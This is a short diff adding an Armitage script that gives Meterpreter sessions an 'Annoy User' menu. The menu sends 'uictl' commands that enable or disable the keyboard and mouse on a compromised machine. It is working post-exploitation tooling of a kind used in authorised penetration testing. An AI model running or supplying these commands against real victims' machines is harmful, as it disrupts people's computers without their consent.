@@ -1,0 +1,14 @@
+# Armitage script to add Annoy User options to meterpreter menu.
+
+popup meterpreter_bottom {
+	menu "Annoy User" {
+		item "Enable Keyboard/Mouse" {
+			m_cmd($1, "uictl enable keyboard");
+			m_cmd($1, "uictl enable mouse");
+		}
+		item "Disable Keyboard/Mouse" {
+			m_cmd($1, "uictl disable keyboard");
+			m_cmd($1, "uictl disable mouse");
+		}
+	}
+}
